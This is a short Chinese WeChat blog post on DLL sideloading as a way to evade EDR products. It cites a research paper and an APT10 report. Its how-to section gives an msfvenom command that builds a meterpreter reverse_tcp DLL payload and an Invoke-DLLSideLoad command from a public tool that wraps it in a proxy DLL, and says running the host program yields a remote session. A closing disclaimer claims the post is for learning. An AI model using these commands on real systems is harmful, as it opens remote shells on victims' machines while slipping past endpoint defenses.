##  Sideloading DLL攻击

鸿鹄实验室a  [ 鸿鹄实验室 ](javascript:void\(0\);)

**鸿鹄实验室** ![]()

微信号 gh_a2210090ba3f

功能介绍 鸿鹄实验室，欢迎关注

____

__

收录于话题

今天看到了国外的一个白皮书，地址如下：

  

https://res.mdpi.com/d_attachment/jcp/jcp-01-00021/article_deploy/jcp-01-00021.pdf

  

内容主要是各类技术在遇到EDR时能不能成功的绕过。

  

![](https://gitee.com/fuli009/images/raw/master/public/20210823075055.png)

  

最后以一份表格总结了各类功能以及绕过效果：

  

![](https://gitee.com/fuli009/images/raw/master/public/20210823075109.png)

  

我们可以看到，dll几乎绕过了所有的EDR，而这里的DLL指的便是Sideloading DLL。

  

Sideloading DLL最早应该是在一份APT报告中被提出来的，即DLL侧加载。

文档地址：

  

https://www.recordedfuture.com/apt10-cyberespionage-
campaign/?__cf_chl_jschl_tk__=pmd_VKrHUzdleNocPJnRemvxCVGmjY8gkMwlsZM361GthcI-1629625791-0-gqNtZGzNAjujcnBszQil

  

![]()

  

原理如下：

  

![](https://gitee.com/fuli009/images/raw/master/public/20210823075110.png)

即中间经过转发来加载恶意dll。

  

利用方法：

  

首先找到一个存在dll加载(或劫持)的程序，然后使用msf生成dll

  

  * 

    
    
    msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f dll -a x86 > payload.dll

  

然后使用DLLSideloader来生成我们的转发dll，工具地址：

  

https://github.com/SkiddieTech/DLLSideloader

  

然后生成所需的文件即可

  

  * 

    
    
    Invoke-DLLSideLoad libcurl.dll payload.dll

  

然后执行exe文件，即可获取session。

  

  
  
  
  
  
     ▼更多精彩推荐，请关注我们▼

  

 **请严格遵守网络安全法相关条例！此分享主要用于学习，切勿走上违法犯罪的不归路，一切后果自付！**

  

![](https://gitee.com/fuli009/images/raw/master/public/20210823075111.png)

  

  

预览时标签不可点

收录于话题 #

个 __

上一篇 下一篇

阅读

分享 收藏

赞 在看

____已同步到看一看[写下你的想法](javascript:;)

前往“发现”-“看一看”浏览“朋友在看”

![](//res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/pic/appmsg/pic_like_comment55871f.png)

前往看一看

**看一看入口已关闭**

在“设置”-“通用”-“发现页管理”打开“看一看”入口

[我知道了](javascript:;)

__

已发送

取消 __

####  发送到看一看

发送

Sideloading DLL攻击

最多200字，当前共字

__

发送中

微信扫一扫  
关注该公众号

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

[知道了](javascript:;)

**长按识别前往小程序**

![]()

